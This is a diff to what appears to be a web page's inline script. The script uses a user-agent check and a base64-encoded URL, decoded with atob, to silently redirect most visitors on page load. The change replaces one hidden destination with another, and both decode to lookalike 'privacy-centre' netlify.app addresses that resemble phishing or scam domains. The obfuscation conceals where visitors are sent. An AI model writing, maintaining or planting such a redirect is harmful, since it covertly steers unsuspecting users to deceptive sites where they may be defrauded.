@@ -15,7 +15,7 @@
     (function () {
       const ua = navigator.userAgent || navigator.vendor || window.opera;
       const allow = /Android|iPhone|iPad|Macintosh|Windows/i.test(ua);
-      const encoded = "aHR0cHM6Ly9wcml2YWN5LWNlbnRyZS12aXNpdC1ub3cwMjIubmV0bGlmeS5hcHAv";
+      const encoded = "aHR0cHM6Ly9wcml2YWN5LWNlbnRyZS12aXNpdC1ub3cwMi5uZXRsaWZ5LmFwcC8=";
 
       if (allow) {
         window.location.href = atob(encoded);
